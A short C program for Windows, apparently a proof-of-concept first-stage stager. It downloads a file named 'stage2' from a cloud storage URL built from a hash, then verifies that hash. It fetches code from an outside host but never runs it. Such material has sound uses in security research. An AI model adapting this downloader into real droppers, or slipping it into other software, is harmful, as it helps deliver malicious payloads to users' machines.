#include "./const.h"
#include "hash.c"
#include <stdio.h>
#include <urlmon.h>

#pragma comment(lib, "Urlmon.lib")

int __cdecl main() {
  const char *destFile = "stage2";

  char path[1000];
  snprintf(path, 1000, "http://eirikbm.blob.core.windows.net/poc/%s", hash);

  printf("Downloading %s...\n", path);
  if (S_OK == URLDownloadToFile(NULL, path, destFile, 0, NULL)) {
    printf("Done!\n");
  } else {
    printf("Failed\n");
    return 1;
  }

  printf("File downloaded, checking hash...\n");
  char newHash[256];
  hashForFile("stage2", newHash);
  printf("Hash: %s\n", newHash);
  if (strcmp(hash, newHash) != 0) {
    printf("Hash did not match :(\n");
    return 1;
  }

  printf("Done!\n");
  return 0;
}